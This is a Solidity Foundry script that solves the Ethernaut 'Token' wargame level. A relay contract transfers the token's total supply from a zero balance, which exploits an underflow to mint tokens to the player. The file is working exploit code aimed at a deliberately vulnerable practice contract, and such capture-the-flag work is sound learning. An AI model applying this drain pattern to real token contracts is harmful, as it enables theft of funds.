// SPDX-License-Identifier: MIT

pragma solidity >=0.8.7 <0.9.0;

import {Ethernaut} from "ethernaut/Ethernaut.sol";
import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Token} from "../src/Token.sol";

/**
 * Level address: 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407
 * The goal of this level is for you to hack the basic token contract below.
 * You are given 20 tokens to start with and you will beat the level if you
 * somehow manage to get your hands on any additional tokens. Preferably a very
 * large amount of tokens.
 *
 * Things that might help:
 * What is an odometer?
 */
contract Relay {
    Token victim;

    constructor(Token _victim) {
        victim = _victim;
    }

    function attack(address me) public {
        victim.transfer(me, victim.totalSupply());
    }
}

contract TokenScript is Attacker {
    Level private level = Level(0x478f3476358Eb166Cb7adE4666d04fbdDB56C407);

    function run() external {
        vm.startBroadcast(me.privateKey);
        Token token = Token(getNewLevelInstance(level));

        uint256 balance = token.balanceOf(me.addr);

        Relay relay = new Relay(token);
        relay.attack(me.addr);

        require(token.balanceOf(me.addr) > balance);
        require(submitInstance());
        vm.stopBroadcast();
    }
}
